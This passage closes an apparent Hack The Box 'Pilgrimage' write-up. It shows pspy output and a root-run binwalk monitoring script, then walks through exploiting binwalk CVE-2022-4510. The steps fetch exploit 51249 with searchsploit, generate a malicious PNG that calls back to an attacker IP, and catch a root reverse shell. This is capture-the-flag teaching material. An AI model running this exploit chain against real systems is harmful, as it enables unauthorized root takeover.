Config: Printing events <span class="o">(</span><span class="nv">colored</span><span class="o">=</span><span class="nb">true</span><span class="o">)</span>: <span class="nv">processes</span><span class="o">=</span><span class="nb">true</span> | file-system-events<span class="o">=</span><span class="nb">false</span> <span class="o">||</span>| Scanning <span class="k">for </span>processes every 100ms and on inotify events <span class="o">||</span>| Watching directories: <span class="o">[</span>/usr /tmp /etc /home /var /opt] <span class="o">(</span>recursive<span class="o">)</span> | <span class="o">[]</span> <span class="o">(</span>non-recursive<span class="o">)</span>
Draining file system events due to startup...
<span class="k">done
</span>2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>1613   | ./pspy64
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1605   |
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1604   |
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1584   |
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>1528   | <span class="nt">-bash</span>
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>1527   | sshd: emily@pts/0
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1515   |
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>1509   | <span class="o">(</span>sd-pam<span class="o">)</span>
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>1507   | /lib/systemd/systemd <span class="nt">--user</span>
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1504   | sshd: emily <span class="o">[</span>priv]
2023/10/16 14:03:12 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1444   |
</code></pre></div></div> <p>Found that the root user executes a file name <code class="language-plaintext highlighter-rouge">malwarescan.sh</code>, which is accessible by the <code class="language-plaintext highlighter-rouge">emily</code> user. ![[20231016-pilgrimage-7.png]]</p> <p>Output of the file <code class="language-plaintext highlighter-rouge">malwarescan.sh</code>:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>emily@pilgrimage:~/test<span class="nv">$ </span><span class="nb">cat</span> /usr/sbin/malwarescan.sh
<span class="c">#!/bin/bash</span>

<span class="nv">blacklist</span><span class="o">=(</span><span class="s2">"Executable script"</span> <span class="s2">"Microsoft executable"</span><span class="o">)</span>

/usr/bin/inotifywait <span class="nt">-m</span> <span class="nt">-e</span> create /var/www/pilgrimage.htb/shrunk/ | <span class="k">while </span><span class="nb">read </span>FILE<span class="p">;</span> <span class="k">do
        </span><span class="nv">filename</span><span class="o">=</span><span class="s2">"/var/www/pilgrimage.htb/shrunk/</span><span class="si">$(</span>/usr/bin/echo <span class="s2">"</span><span class="nv">$FILE</span><span class="s2">"</span> | /usr/bin/tail <span class="nt">-n</span> 1 | /usr/bin/sed <span class="nt">-n</span> <span class="nt">-e</span> <span class="s1">'s/^.*CREATE //p'</span><span class="si">)</span><span class="s2">"</span>
        <span class="nv">binout</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span>/usr/local/bin/binwalk <span class="nt">-e</span> <span class="s2">"</span><span class="nv">$filename</span><span class="s2">"</span><span class="si">)</span><span class="s2">"</span>
        <span class="k">for </span>banned <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">blacklist</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
                if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$binout</span><span class="s2">"</span> <span class="o">==</span> <span class="k">*</span><span class="s2">"</span><span class="nv">$banned</span><span class="s2">"</span><span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
                        /usr/bin/rm <span class="s2">"</span><span class="nv">$filename</span><span class="s2">"</span>
                        <span class="nb">break
                </span><span class="k">fi
        done
done</span>
</code></pre></div></div> <p>The script seems monitors <code class="language-plaintext highlighter-rouge">var/www/pilgrimage.htb/shrunk/</code> for any newly created files. When a new file is created, it runs various checks to see if the file is of a “blacklisted” type, and if so, removes the file.</p> <p>It is using <code class="language-plaintext highlighter-rouge">binwalk</code> version that is vulnerable</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>emily@pilgrimage:~/test<span class="nv">$ </span>binwalk

Binwalk v2.3.2
</code></pre></div></div> <p>In the context of the script, binwalk is used to identify the type or characteristics of the newly-created files. If the file has characteristics that match any in a blacklist, the file is removed.</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/pilgrimage/exploits]
└─<span class="nv">$ </span>searchsploit <span class="nt">-m</span> 51249
  Exploit: Binwalk v2.3.2 - Remote Command Execution <span class="o">(</span>RCE<span class="o">)</span>
      URL: https://www.exploit-db.com/exploits/51249
     Path: /usr/share/exploitdb/exploits/python/remote/51249.py
    Codes: CVE-2022-4510
 Verified: False
File Type: ASCII text, with very long lines <span class="o">(</span>614<span class="o">)</span>
Copied to: /home/kali/Documents/HTB-Machines/pilgrimage/exploits/51249.py
</code></pre></div></div> <p>Use the exploit to prepare the file:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/pilgrimage/exploits]
└─<span class="nv">$ </span><span class="nb">chmod</span> +x 51249.py

┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/pilgrimage/exploits]
└─<span class="nv">$ </span>python3 51249.py image.png 10.10.14.12 443

<span class="c">################################################</span>
<span class="nt">------------------CVE-2022-4510----------------</span>
<span class="c">################################################</span>
<span class="nt">--------Binwalk</span> Remote Command Execution--------
<span class="nt">------Binwalk</span> 2.1.2b through 2.3.2 included-----
<span class="nt">------------------------------------------------</span>
<span class="c">################################################</span>
<span class="nt">----------Exploit</span> by: Etienne Lacoche-----------
<span class="nt">---------Contact</span> Twitter: @electr0sm0g----------
<span class="nt">------------------Discovered</span> by:----------------
<span class="nt">---------Q</span><span class="nb">.</span> Kaiser, ONEKEY Research Lab---------
<span class="nt">---------Exploit</span> tested on debian 11------------
<span class="c">################################################</span>


You can now rename and share binwalk_exploit and start your <span class="nb">local </span>netcat listener.


┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/pilgrimage/exploits]
└─<span class="nv">$ </span><span class="nb">ls
</span>51249.py  binwalk_exploit.png  CVE-2022-44268  image.png  pspy64
</code></pre></div></div> <p>Upload the file to <code class="language-plaintext highlighter-rouge">/var/www/pilgrimage.htb/shrunk</code> and start a listener.</p> <p><img src="/assets/img/20231016-pilgrimage-8.png" alt="Image of PE" class="auto-resize"/></p> <p>Done and dusted!</p>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="easy-box"/><category term="HTB"/><category term="CTF"/><category term="RCE"/><category term="LFI"/><category term="AFR"/><summary type="html"><![CDATA[Pilgrimage - Hack The Box write-up.]]></summary></entry></feed>